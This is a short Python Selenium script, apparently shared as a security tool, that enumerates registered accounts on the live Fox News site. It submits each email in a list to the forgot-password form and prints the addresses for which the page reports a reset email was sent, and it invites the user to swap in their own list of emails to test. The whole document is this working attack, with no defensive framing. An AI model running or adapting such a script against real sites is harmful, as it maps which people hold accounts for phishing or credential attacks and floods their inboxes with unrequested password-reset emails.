# User Enum Fox News
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff

print("The usernames present in Foxnews are:")

# Place all the Email IDs to test in the for loop as shown below.
# You can remove all the Email IDs below
for i in ["supeasdasdrman@gmail.com", "priyanka@gmail.com", "batman@gmail.com", "michael@gmail.com", "raghavdevgon@yahoo.com"]:

    # Using edge browser
    driver = webdriver.Edge(executable_path='msedgedriver')

    # Using Firefox browser
    # driver = webdriver.FirefoxProfile()
    # driver = webdriver.Firefox(driver)

    user = i
    driver.get("https://my.foxnews.com/?p=forgot-password")
    p1 = driver.page_source
    sleep(2)
    # elem=driver.find_element_by_xpath("//input[@type='email']")
    elem = driver.find_element_by_name("email")
    sleep(1)
    elem.send_keys(user)
    elem.send_keys(Keys.RETURN)
    sleep(2)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2, p1)

    if "Reset email sent! Please check your inbox." in p3:
        print(i)
    sleep(2)
    driver.close()